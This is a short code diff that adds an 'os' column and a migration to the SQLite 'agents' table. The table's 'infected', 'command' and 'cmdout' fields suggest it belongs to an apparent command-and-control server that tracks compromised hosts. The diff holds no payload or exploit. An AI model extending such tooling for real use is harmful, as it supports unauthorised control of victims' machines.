@@ -22,9 +22,15 @@ def init_database():
             infected TEXT,
             last_seen TEXT,
             command TEXT,
-            cmdout TEXT
+            cmdout TEXT,
+            os TEXT
         )
     ''')
+    # Migration: add os column to existing databases
+    try:
+        cursor.execute('ALTER TABLE agents ADD COLUMN os TEXT')
+    except sqlite3.OperationalError:
+        pass  # Column already exists
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS command_history (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
